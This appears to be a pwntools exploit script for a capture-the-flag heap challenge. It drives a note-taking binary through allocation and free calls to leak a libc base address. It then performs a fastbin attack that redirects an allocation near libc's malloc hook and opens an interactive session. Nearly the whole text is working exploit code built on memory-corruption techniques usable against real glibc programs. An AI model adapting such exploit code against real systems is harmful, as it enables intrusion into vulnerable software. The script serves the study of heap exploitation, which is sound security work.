from pwn import *

s = process("./test")

def add_note(pay):
	s.recvuntil("Your choice:")
	s.sendline("2")
	s.recvuntil("Length of new note:")
	s.sendline(str(len(pay)))
	s.recvuntil("Enter your note:")
	s.send(pay)

def delete_note(idx):
	s.recvuntil("Your choice:")
        s.sendline("4")
	s.recvuntil("Note number:")
	s.sendline(str(idx))

def list_note():
	s.recvuntil("Your choice:")
        s.sendline("1")

def edit_note(idx,pay):
	s.recvuntil("Your choice:")
        s.sendline("3")
	s.recvuntil("Note number:")
	s.sendline(str(idx))
	s.recvuntil("Length of note:")
	s.sendline(str(len(pay)))
	s.recvuntil("Enter your note:")
	s.send(pay)

add_note('A'*0x80)#0
add_note('B'*0x80)#1
add_note('C'*0x80)#2
add_note('D'*0x60)#3
add_note('E'*0x60)#4
raw_input("step1 success")
delete_note(2)
delete_note(0)
add_note('F'*0x80)#0
raw_input("step2 success")
delete_note(2)
add_note('G'*0x80)#2
list_note()
s.recvuntil('0. ')
libc = u64(s.recv(6)+'\x00'*2)-0x3c4b78
print 'libc:',hex(libc)
raw_input("step3 success")
delete_note(3)
delete_note(4)
add_note('H'*0x60)#3
raw_input("step4 success")
delete_note(4)
edit_note(3,p64(libc+0x3c4aed)+'I'*0x58)
add_note('K'*0x60)
add_note('L'*0x60)
raw_input("step5 success")
#add_note('E'*0x10)
s.interactive()
